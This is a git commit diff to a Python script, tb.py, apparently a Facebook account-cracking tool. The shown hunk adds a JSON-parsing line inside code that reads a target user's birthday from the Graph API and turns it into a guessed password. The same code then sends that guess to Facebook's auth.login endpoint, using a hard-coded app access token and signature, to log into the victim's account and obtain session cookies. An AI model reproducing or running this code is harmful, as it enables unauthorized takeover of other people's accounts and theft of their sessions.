a1c44f5b0af05152a22363e82e51d08959bed1d9
premium1707 <52435071+premium1707@users.noreply.github.com>
2019-07-26 08:40:04 +0700

    Add files via upload

--- tb.py
+++ tb.py
@@ -1441,6 +1441,7 @@ def pilih_super():
 								else:
 									#Pass4
 									a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+									b = json.loads(a.text)
 									lahir = b['birthday']
 									pass4 = lahir.replace('/', '')
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
